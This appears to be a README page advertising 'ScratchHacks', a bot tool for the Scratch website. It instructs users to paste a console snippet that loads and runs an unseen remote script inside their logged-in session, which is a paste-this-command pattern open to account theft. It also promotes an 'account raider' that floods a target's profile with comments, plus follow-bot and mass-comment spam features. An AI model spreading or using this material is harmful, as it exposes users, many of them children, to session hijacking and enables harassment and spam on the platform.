## Welcome to SCRATCHHACKS

ScratchHacks is a new tool for the [Scratch](https://scratch.mit.edu) website to troll, bot and get free followers!


### Activating SCRATCHHACKS on your account

ScratchHacks is easy to activate, with just 4 easy steps!

1. Check if you have a supported browser (Chrome, Firefox, Edge)
2. Go to your Scratch profile and press the F12 key on your keyboard 
3. If not already selected, click console.
4. Copy and paste the code below into the browser console.

```markdown
(function() {
    var s = document.createElement('script');
    s.type = "text/javascript";               
    s.async = true;                        
    s.src = "//scratchhacks.github.io/hacks.js"; 
    var fs = document.getElementsByTagName('script')[0];
    fs.parentNode.insertBefore(s, fs);
})();
starthacks();
```

Stuck? Watch [this video](https://guides.github.com/features/mastering-markdown/).

### Hacks availible
**Follow bot**
A follow bot basicly follows a load of people, then they follow you back resulting in free, real followers!

**Account raider**
The account raider floods an account with comments (one every 30 seconds) and is just very annoying for the person on the other end.

**Auto F4F**
Follows all your followers back!

**Super Advertisment**
This sends a comment to a load of people telling them to check out your project.



### Support or Contact

If you have a problem, add an issue in GitHub.
